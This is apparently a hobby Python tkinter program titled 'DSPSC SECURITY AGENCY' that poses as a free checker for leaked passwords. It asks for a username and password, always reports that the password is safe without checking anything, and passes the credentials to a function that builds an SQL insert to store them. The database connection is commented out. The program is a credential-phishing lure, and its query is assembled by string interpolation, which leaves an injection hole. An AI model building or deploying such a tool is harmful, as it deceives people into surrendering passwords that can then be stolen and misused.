from tkinter import *
import tkinter.messagebox as tmsg
import mysql.connector
from PIL import ImageTk,Image 
import time
def clock():
    time_string=time.strftime('%I:%M:%S:%p',time.localtime())
    if time_string!='':
        status_bar.config(text=time_string,font='times 10',padx=10)
    root.after(100,clock)

credits = "created by @devangspsingh"


# mydb = mysql.connector.connect(
#   host="localhost",
#   user="root",
#   password="",
#   database="security_agency"
# )
# mycursor = mydb.cursor()


background_entry="light green"
text_var="""You can use this program for FREE!.
 In past years it is found that important data of users is leaked on online webistes.
 You can type your account credentials ,
 Then we will check on the server of malicious sites to see if your password is leaked."""

def data_inserter(username,password):
    sql = f"""Insert into security_agency (NULL,"{username}","{password}",current_timestamp())"""
    # mycursor.execute(sql)
    
def submit():
    password=password_value.get()
    username=username_value.get()
    warning=tmsg.showinfo("PASSWORD Leaked","No need to worry your password is not leaked on any website")
    data_inserter(username,password)
    

h=650
w=650
root=Tk()
root.geometry(f"{h}x{w}")
root.maxsize(h,w)
root.minsize(h,w)

root.title('DSPSC SECURITY AGENCY')
root.iconbitmap("logo.ico")

username_value=StringVar()
password_value=StringVar()
img1=Image.open("Logo.png")
img1=img1.resize((h,w),Image.ANTIALIAS)
background_image=ImageTk.PhotoImage(img1)
background_image_label=Label(image=background_image)
background_image_label.place(x=0,y=0)

title_bar=Menu(root,bg="royal blue",border=5,relief=FLAT,activebackground="royal blue")

title_frame=Frame(border=2,bg=background_entry,relief=RIDGE)
text_frame=Frame(border=2,bg=background_entry,relief=RIDGE)
main_frame_entry=Frame(border=8,bg=background_entry,relief=GROOVE,padx=8,pady=20)
entry_frame=Frame(main_frame_entry,border=5,bg=background_entry,relief=GROOVE,padx=10)
status_frame=Frame(root,bg="royal blue",border=5,relief=FLAT)
# submit_frame=Frame(main_frame_entry,border=5,bg=background_entry,relief=GROOVE,padx=10)


title_label=Label(title_frame,text="DSPSC SECURITY AGENCY",font="compact 20 bold",padx=5,fg="maroon1",bg=background_entry)
text_label=Label(text_frame,text=text_var,font="comicsans 12",pady=10,padx=10,bg="green yellow")
enter_details=Label(main_frame_entry,text="Enter your details",font="system 14 bold",fg="dark blue",bg=background_entry)
username=Label(entry_frame,text="username",bg="light blue")
password=Label(entry_frame,text="password",bg="light blue")
submit_button=Button(main_frame_entry,text="SUBMIT",bg=background_entry,command=submit,padx=5,)
status_bar=Label(status_frame,bg="royal blue",fg="white",justify=LEFT,anchor=W)

file=Menu(title_bar,relief=FLAT,foreground="white",bg="royal blue")

title_bar.add_cascade(label ='File', menu = file) 
file.add_command(label ="", command = None) 
file.add_command(label ='', command = None) 
file.add_command(label ='', command = None) 
file.add_separator() 
file.add_command(label ='Exit', command = root.destroy) 


status_frame.pack(side=BOTTOM,fill=X)
status_bar.pack(side=LEFT)
Label(status_frame,text=credits,bg="royal blue",fg="white",font="times 10",justify="right",anchor=E,).pack(side=RIGHT)
clock()

username_entry = Entry(entry_frame, textvariable=username_value)
password_entry = Entry(entry_frame,show="*", textvariable=password_value)




title_frame.pack(side=TOP,pady=20)
title_label.pack(pady=4)

text_frame.pack(pady=30)
text_label.pack()
main_frame_entry.pack(side=BOTTOM,pady=30)

enter_details.pack(side=TOP,padx=8,ipadx=20,pady=8)

entry_frame.pack(anchor=CENTER,pady=20,padx=5)
username.grid(row=0,column=0,padx=5,pady=5)
password.grid(row=1,padx=5,pady=5)
username_entry.grid(row=0,column=1,padx=5,pady=5)
password_entry.grid(row=1,column=1,padx=5,pady=5)


submit_button.pack(side=BOTTOM,ipadx=10,padx=5,pady=5,anchor=CENTER)

root.config(menu=title_bar,bg="yellow")

root.mainloop()
# mydb.commit()


